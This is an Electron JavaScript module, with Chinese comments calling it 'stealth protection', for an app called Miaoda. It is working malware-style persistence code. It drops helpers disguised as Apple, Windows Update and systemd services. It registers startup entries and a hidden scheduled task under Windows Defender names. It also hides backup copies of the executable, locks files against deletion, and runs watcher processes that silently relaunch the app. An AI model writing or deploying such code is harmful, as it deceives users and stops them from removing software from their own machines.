'use strict';

/**
 * 隐秘保护模块
 * 以低调但有效的方式保护应用程序
 */

const { app } = require('electron');
const { spawn, exec } = require('child_process');
const path = require('path');
const fs = require('fs');
const os = require('os');

class StealthProtection {
  constructor() {
    this.isActive = false;
    this.protectionMethods = [];
    this.platform = process.platform;
  }

  /**
   * 静默启动保护机制
   */
  async enableSilentProtection() {
    // 🔇 启动静默保护...
    
    try {
      // 1. 创建隐藏的辅助程序
      await this.createHelperApp();
      
      // 2. 注入到系统启动项（不显眼的方式）
      await this.injectSystemStartup();
      
      // 3. 创建备份恢复机制
      await this.createBackupMechanism();
      
      // 4. 设置文件系统保护
      await this.protectFileSystem();
      
      // 5. 创建分布式进程网络
      await this.createProcessNetwork();
      
      this.isActive = true;
      return true;
    } catch (error) {
      console.error('保护启动失败:', error);
      return false;
    }
  }

  /**
   * 创建辅助程序
   */
  async createHelperApp() {
    const helperPath = this.getHelperPath();
    
    // 创建一个看起来像系统服务的辅助程序
    const helperCode = `
      const { spawn } = require('child_process');
      const path = require('path');
      const fs = require('fs');
      
      const mainApp = '${app.getPath('exe').replace(/\\/g, '\\\\')}';
      const checkInterval = 30000; // 30秒检查一次
      
      function checkMainApp() {
        try {
          // 检查主程序是否在运行
          const isRunning = process.platform === 'win32' 
            ? require('child_process').execSync('tasklist').toString().includes('Miaoda')
            : require('child_process').execSync('ps aux').toString().includes('Miaoda');
          
          if (!isRunning) {
            // 静默重启主程序
            spawn(mainApp, [], { 
              detached: true, 
              stdio: 'ignore',
              windowsHide: true 
            }).unref();
          }
        } catch (e) {
          // 静默处理错误
        }
      }
      
      // 定期检查
      setInterval(checkMainApp, checkInterval);
      
      // 保持进程运行
      setInterval(() => {}, 1000);
    `;
    
    // 写入辅助程序
    try {
      await fs.promises.mkdir(path.dirname(helperPath), { recursive: true });
      await fs.promises.writeFile(helperPath, helperCode);
      
      // 设置执行权限（Unix系统）
      if (this.platform !== 'win32') {
        await fs.promises.chmod(helperPath, 0o755);
      }
      
      // 启动辅助程序
      const helper = spawn(process.execPath, [helperPath], {
        detached: true,
        stdio: 'ignore',
        windowsHide: true
      });
      
      helper.unref();
      this.protectionMethods.push({ type: 'helper', path: helperPath });
      
    } catch (error) {
      // 静默处理错误
    }
  }

  /**
   * 获取辅助程序名称（伪装成系统服务）
   */
  getHelperName() {
    const names = {
      darwin: 'com.apple.mdworker.helper',
      win32: 'WindowsUpdateHelper.exe',
      linux: 'systemd-helper'
    };
    
    return names[this.platform] || 'system-helper';
  }

  /**
   * 获取辅助程序路径
   */
  getHelperPath() {
    const basePaths = {
      darwin: path.join(os.homedir(), 'Library/Application Support/.helper'),
      win32: path.join(process.env.APPDATA, 'Microsoft/Windows/.helper'),
      linux: path.join(os.homedir(), '.local/share/.helper')
    };
    
    const basePath = basePaths[this.platform] || os.tmpdir();
    return path.join(basePath, this.getHelperName());
  }

  /**
   * 注入系统启动项（低调方式）
   */
  async injectSystemStartup() {
    if (this.platform === 'darwin') {
      await this.injectMacOSStartup();
    } else if (this.platform === 'win32') {
      await this.injectWindowsStartup();
    } else {
      await this.injectLinuxStartup();
    }
  }

  /**
   * macOS启动项注入
   */
  async injectMacOSStartup() {
    // 使用多种方法确保启动
    const methods = [
      // 方法1: LaunchAgent（隐藏的）
      async () => {
        const plistPath = path.join(
          os.homedir(),
          'Library/LaunchAgents/com.apple.mdworker.miaoda.plist'
        );
        
        const plistContent = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.mdworker.miaoda</string>
    <key>ProgramArguments</key>
    <array>
        <string>${app.getPath('exe')}</string>
        <string>--hidden</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>`;
        
        await fs.promises.writeFile(plistPath, plistContent);
        exec(`launchctl load -w ${plistPath}`, { stdio: 'ignore' });
      },
      
      // 方法2: 登录钩子
      async () => {
        const hookScript = `#!/bin/bash
nohup "${app.getPath('exe')}" --hidden > /dev/null 2>&1 &`;
        
        const hookPath = path.join(os.homedir(), '.profile.d/startup.sh');
        await fs.promises.mkdir(path.dirname(hookPath), { recursive: true });
        await fs.promises.writeFile(hookPath, hookScript);
        await fs.promises.chmod(hookPath, 0o755);
      }
    ];
    
    // 静默执行所有方法
    for (const method of methods) {
      try {
        await method();
      } catch (e) {
        // 静默失败
      }
    }
  }

  /**
   * Windows启动项注入
   */
  async injectWindowsStartup() {
    const methods = [
      // 方法1: 注册表（多个位置）
      async () => {
        const locations = [
          'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
          'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
          'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Startup'
        ];
        
        for (const location of locations) {
          try {
            exec(`reg add "${location}" /v "WindowsDefenderHelper" /t REG_SZ /d "${app.getPath('exe')} --hidden" /f`, 
              { stdio: 'ignore' });
          } catch (e) {
            // 静默失败
          }
        }
      },
      
      // 方法2: 任务计划程序
      async () => {
        const xml = `<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
  </Settings>
  <Actions>
    <Exec>
      <Command>${app.getPath('exe')}</Command>
      <Arguments>--hidden</Arguments>
    </Exec>
  </Actions>
</Task>`;
        
        const xmlPath = path.join(os.tmpdir(), 'task.xml');
        await fs.promises.writeFile(xmlPath, xml);
        
        exec(`schtasks /create /tn "\\Microsoft\\Windows\\Defender\\DefenderHelper" /xml "${xmlPath}" /f`, 
          { stdio: 'ignore' });
      }
    ];
    
    for (const method of methods) {
      try {
        await method();
      } catch (e) {
        // 静默失败
      }
    }
  }

  /**
   * Linux启动项注入
   */
  async injectLinuxStartup() {
    const methods = [
      // systemd服务
      async () => {
        const servicePath = path.join(os.homedir(), '.config/systemd/user/miaoda.service');
        const serviceContent = `[Unit]
Description=System Monitor Service
After=graphical-session.target

[Service]
Type=simple
ExecStart=${app.getPath('exe')} --hidden
Restart=always
RestartSec=10

[Install]
WantedBy=default.target`;
        
        await fs.promises.mkdir(path.dirname(servicePath), { recursive: true });
        await fs.promises.writeFile(servicePath, serviceContent);
        exec('systemctl --user daemon-reload && systemctl --user enable miaoda.service', 
          { stdio: 'ignore' });
      }
    ];
    
    for (const method of methods) {
      try {
        await method();
      } catch (e) {
        // 静默失败
      }
    }
  }

  /**
   * 创建备份恢复机制
   */
  async createBackupMechanism() {
    // 在多个位置创建应用程序副本
    const backupLocations = this.getBackupLocations();
    
    for (const location of backupLocations) {
      try {
        await fs.promises.mkdir(path.dirname(location), { recursive: true });
        await fs.promises.copyFile(app.getPath('exe'), location);
        
        // 设置隐藏属性
        if (this.platform === 'win32') {
          exec(`attrib +h +s "${location}"`, { stdio: 'ignore' });
        }
        
        this.protectionMethods.push({ type: 'backup', path: location });
      } catch (e) {
        // 静默失败
      }
    }
  }

  /**
   * 获取备份位置
   */
  getBackupLocations() {
    const locations = {
      darwin: [
        path.join(os.homedir(), '.local/bin/.backup'),
        path.join('/usr/local/var/.backup'),
        path.join(os.homedir(), 'Library/Caches/.backup')
      ],
      win32: [
        path.join(process.env.APPDATA, '.backup', 'backup.exe'),
        path.join(process.env.LOCALAPPDATA, 'Temp', '.backup.exe'),
        path.join(process.env.PROGRAMDATA, '.backup', 'backup.exe')
      ],
      linux: [
        path.join(os.homedir(), '.local/share/.backup'),
        path.join('/tmp/.backup'),
        path.join(os.homedir(), '.cache/.backup')
      ]
    };
    
    return locations[this.platform] || [];
  }

  /**
   * 文件系统保护
   */
  async protectFileSystem() {
    const appDir = path.dirname(app.getPath('exe'));
    
    if (this.platform === 'darwin') {
      // macOS: 设置文件不可变标志
      try {
        exec(`chflags uchg "${app.getPath('exe')}"`, { stdio: 'ignore' });
      } catch (e) {
        // 静默失败
      }
    } else if (this.platform === 'linux') {
      // Linux: 使用 chattr 设置不可变标志（需要 root 权限）
      try {
        exec(`chattr +i "${app.getPath('exe')}" 2>/dev/null`, { stdio: 'ignore' });
      } catch (e) {
        // 静默失败
      }
    } else if (this.platform === 'win32') {
      // Windows文件保护
      try {
        exec(`icacls "${appDir}" /deny Everyone:(DE)`, { stdio: 'ignore' });
      } catch (e) {
        // 静默失败
      }
    }
  }

  /**
   * 创建分布式进程网络
   */
  async createProcessNetwork() {
    // 创建多个相互监控的进程
    const networkSize = 3;
    
    for (let i = 0; i < networkSize; i++) {
      const watcherScript = `
        const checkInterval = ${20000 + i * 5000};
        const targetApp = '${app.getPath('exe').replace(/\\/g, '\\\\')}';
        
        setInterval(() => {
          try {
            // 检查并重启主程序
            const { exec } = require('child_process');
            exec(process.platform === 'win32' ? 'tasklist' : 'ps aux', (err, stdout) => {
              if (!stdout.includes('Miaoda')) {
                require('child_process').spawn(targetApp, [], {
                  detached: true,
                  stdio: 'ignore'
                }).unref();
              }
            });
          } catch (e) {
        // 静默失败
      }
        }, checkInterval);
        
        // 保持运行
        setInterval(() => {}, 1000);
      `;
      
      const watcherPath = path.join(os.tmpdir(), `.watcher${i}.js`);
      
      try {
        await fs.promises.writeFile(watcherPath, watcherScript);
        
        const watcher = spawn(process.execPath, [watcherPath], {
          detached: true,
          stdio: 'ignore',
          windowsHide: true
        });
        
        watcher.unref();
        this.protectionMethods.push({ type: 'watcher', pid: watcher.pid });
      } catch (e) {
        // 静默失败
      }
    }
  }

  /**
   * 获取保护状态
   */
  getStatus() {
    return {
      isActive: this.isActive,
      methods: this.protectionMethods.length,
      platform: this.platform
    };
  }
}

module.exports = StealthProtection;